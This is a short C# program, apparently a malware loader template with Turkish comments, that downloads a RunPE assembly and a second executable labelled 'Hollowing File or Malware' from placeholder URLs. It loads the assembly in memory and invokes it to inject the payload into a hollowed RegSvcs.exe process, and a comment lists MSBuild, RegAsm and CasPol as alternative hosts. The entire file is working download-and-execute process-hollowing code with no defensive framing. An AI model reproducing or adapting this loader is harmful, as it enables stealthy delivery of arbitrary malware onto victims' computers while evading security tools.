using System;
using System.Net.Http;
using System.Reflection;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        // Raw Assembly Base64 Encoded URL
        string run = "runpe direct encoded base64 link";

        // Raw Assembly indirme
        using var httpClient = new HttpClient();
        byte[] run2 = await httpClient.GetByteArrayAsync(run);

        // Hollowing File veya Malware Base64 Encoded URL
        string santez = "exe direct encoded base64 link";

        // Hollowing File veya Malware indirme
        Uri santezUri = new Uri(santez);
        byte[] santez3 = await httpClient.GetByteArrayAsync(santezUri);

        // InvokeMethod arguments
        // Regsvcs, CasPol, Regasm, MSBuild, aspnet...
        string ph = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe";
        object target = null;
        object[] arguments = { ph, santez3 };

        // Assembly download and method run.
        Assembly assembly = Assembly.Load(run2);
        Type type = assembly.GetType("projename.classname");
        type.InvokeMember("runname", BindingFlags.InvokeMethod, null, target, arguments);
    }
}
